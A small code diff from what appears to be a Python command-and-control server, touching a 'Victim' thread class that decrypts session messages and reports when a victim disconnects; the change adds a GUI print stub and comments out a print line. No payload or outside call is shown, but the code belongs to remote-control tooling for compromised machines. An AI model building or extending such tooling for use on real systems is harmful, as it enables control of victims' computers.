@@ -48,6 +48,10 @@ class Victim(Thread):
             print("An error has occured in Syncronization");
             sys.exit(-1)
         self.conn.settimeout(5)
+
+    #shell function for next milestone which will be to get the GUI built
+    def print2DB(self,msg):
+        print(str(self.name) +"\n" + str(msg))
     
     def applyOTP(self,OTP, KEY):
         return bytes(o ^ k for o, k in zip(OTP, KEY))
@@ -80,7 +84,7 @@ class Victim(Thread):
             self.conn.sendall(b"\x01")
             plaintext = sessionCipher.decrypt(MSG[16:])
             self.SessionIV = MSG[:16]
-            print(str(self.name))
+        #    print(str(self.name))
             return plaintext;
         except Exception as msg:
             print("C2 Server> Victim " + self.get_name() + " Disconnected! ")
